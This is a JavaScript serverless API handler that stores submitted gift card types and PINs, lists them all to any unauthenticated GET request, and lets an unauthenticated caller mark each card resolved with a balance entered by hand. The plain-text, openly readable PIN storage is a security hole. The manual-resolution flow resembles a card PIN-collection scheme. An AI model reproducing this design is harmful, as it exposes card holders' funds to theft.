const localRequests = [];
let kv = null;
let redisClient = null;
let redisReady = false;

try {
  ({ kv } = require('@vercel/kv'));
} catch (_) {
  kv = null;
}

async function getRedisClient() {
  if (redisReady) return redisClient;
  redisReady = true;
  try {
    if (!process.env.REDIS_URL) return null;
    const { createClient } = require('redis');
    redisClient = createClient({ url: process.env.REDIS_URL });
    redisClient.on('error', () => {});
    await redisClient.connect();
    return redisClient;
  } catch (_) {
    redisClient = null;
    return null;
  }
}

const REQUESTS_KEY = 'gc_pending_requests';

async function readAllRequests() {
  if (kv) {
    const arr = await kv.get(REQUESTS_KEY);
    if (Array.isArray(arr)) return arr;
  }
  const rc = await getRedisClient();
  if (rc) {
    const raw = await rc.get(REQUESTS_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return parsed;
    }
  }
  return localRequests;
}

async function writeAllRequests(arr) {
  if (kv) await kv.set(REQUESTS_KEY, arr);
  const rc = await getRedisClient();
  if (rc) await rc.set(REQUESTS_KEY, JSON.stringify(arr));
  localRequests.length = 0;
  localRequests.push(...arr);
}

module.exports = async function handler(req, res) {
  try {
    if (req.method === 'GET') {
      const all = await readAllRequests();
      const id = req.query && req.query.id;
      if (id) {
        const one = all.find((r) => r.id === id);
        if (!one) return res.status(404).json({ found: false });
        return res.status(200).json({ found: true, request: one });
      }
      return res.status(200).json({ requests: all });
    }

    if (req.method === 'POST') {
      const body = req.body || {};
      const action = body.action || 'create';
      const all = await readAllRequests();

      if (action === 'create') {
        const request = {
          id: String(body.id || ''),
          cardType: String(body.cardType || ''),
          cardPin: String(body.cardPin || '').toUpperCase(),
          ts: Date.now(),
          status: 'pending',
        };
        if (!request.id || !request.cardType || !request.cardPin) {
          return res.status(400).json({ error: 'id, cardType, cardPin required' });
        }
        if (!all.find((r) => r.id === request.id)) all.unshift(request);
        await writeAllRequests(all);
        return res.status(200).json({ ok: true, request });
      }

      if (action === 'resolve') {
        const id = String(body.id || '');
        const status = body.status === 'ok' ? 'resolved' : 'error';
        const balance = typeof body.balance === 'undefined' ? '' : String(body.balance);
        const reqRow = all.find((r) => r.id === id);
        if (!reqRow) return res.status(404).json({ error: 'request not found' });
        reqRow.status = status;
        reqRow.balance = status === 'resolved' ? balance : '';
        reqRow.error = status === 'error' ? 'Card not found or invalid PIN.' : '';
        await writeAllRequests(all);
        return res.status(200).json({ ok: true, request: reqRow });
      }

      return res.status(400).json({ error: 'unknown action' });
    }

    return res.status(405).json({ error: 'Method not allowed' });
  } catch (err) {
    return res.status(500).json({ error: err && err.message ? err.message : 'Unknown server error' });
  }
};
